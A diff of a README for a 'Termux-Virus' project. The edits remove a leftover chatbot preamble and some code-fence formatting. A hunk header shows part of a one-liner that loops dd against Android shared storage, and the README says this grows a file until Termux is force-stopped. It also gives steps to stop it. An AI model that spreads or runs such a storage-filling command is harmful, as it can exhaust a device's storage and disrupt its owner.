@@ -1,6 +1,3 @@
-Here’s the complete README file content with the sections you specified formatted as code:
-
-
 # Termux-Virus
 
 ⚠ **Warning**: Run at your own risk.
@@ -15,13 +12,12 @@ termux-setup-storage && if [ -d "/storage/emulated/0" ]; then while true; do dd 
 
 ## ⭐️ HOW IT WORKS ⭐️
 
-```markdown
 👨‍💻 This command automatically generates a single file and continuously increases its size until you force stop Termux.
-```
+
 
 ## 🛑 HOW TO STOP IT 🛑
 
-```markdown
+
 You can stop the script in two ways:
 
 1. **Using Ctrl + C**:
@@ -38,7 +34,6 @@ You can stop the script in two ways:
      ```bash
      kill <PID>
      ```
-```
+
 
 💎 **Made By**: @SG_Modder1
-```
